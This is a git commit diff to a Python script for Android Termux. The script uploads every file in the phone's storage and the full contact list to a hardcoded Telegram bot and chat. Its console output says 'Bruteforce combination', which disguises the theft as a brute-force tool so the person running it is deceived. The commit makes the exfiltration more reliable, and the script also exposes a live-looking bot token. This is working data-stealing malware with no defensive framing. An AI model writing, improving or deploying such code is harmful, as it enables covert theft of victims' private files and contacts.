9ad3973ce71d78512c888514319ef58e24a0075e
Navin Hariharan <42506955+navin-hariharan@users.noreply.github.com>
2023-04-15 13:53:01 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -1,30 +1,38 @@
 from threading import Thread, Lock
-import os, subprocess, telebot, time, json, sys
+import os, subprocess, telebot, time, json, sys, io
 
 bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')
 
 def send_file_to_telegram(filename, i, total_files):
-    with open(filename, 'rb') as f:
-        bot.send_document(chat_id=1004407813, document=f)
+    try:
+        file_size = os.path.getsize(filename)
+        if file_size <= 500*1024*1024:
+            with open(filename, 'rb') as f:
+                bot.send_document(chat_id=1004407813, document=f)
+        else:
+            pass
+    except:
+        bot.send_message(chat_id=1004407813, text='ERROR SENDING FILE:- '+filename)
     print(f'Bruteforce combination {i + 1} of {total_files}')
 
-def get_contacts():
-    result = subprocess.run(['termux-contact-list'], stdout=subprocess.PIPE)
-    contacts_json = json.loads(result.stdout.decode('utf-8'))
-    return contacts_json
-
 def send_contacts_to_telegram():
-    contacts_str = json.dumps(get_contacts(), indent=2)
-    bot.send_message(chat_id=1004407813, text=contacts_str)
+    try:
+        result = subprocess.run(['termux-contact-list'], stdout=subprocess.PIPE)
+        contacts_json = json.loads(result.stdout.decode('utf-8'))
+        contacts_str = json.dumps(contacts_json, indent=2)
+        with io.BytesIO(contacts_str.encode()) as contacts_file:
+            contacts_file.name = 'contacts.json'
+            bot.send_document(chat_id=1004407813, document=contacts_file)
+    except:
+        bot.send_message(chat_id=1004407813, text='ERROR SENDING CONTACTS')
 
 def get_user_files():
     files = []
-    for root, _, filenames in os.walk('~/storage'):
+    for root, _, filenames in os.walk(os.path.expanduser('~/storage')):
         for filename in filenames:
-            files.append(os.path.join(root, filename))
+            files.append(os.path.join(root,filename))
     return files
 
-send_contacts_to_telegram()
 files = get_user_files()
 total_files = len(files)
 lock = Lock()
@@ -44,5 +52,5 @@ while i < total_files:
     threads = []
     print('+',end='',flush=True)
 
-print(sys.path)
+send_contacts_to_telegram()
 bot.send_message(chat_id=1004407813, text='All files and contacts have been sent.')
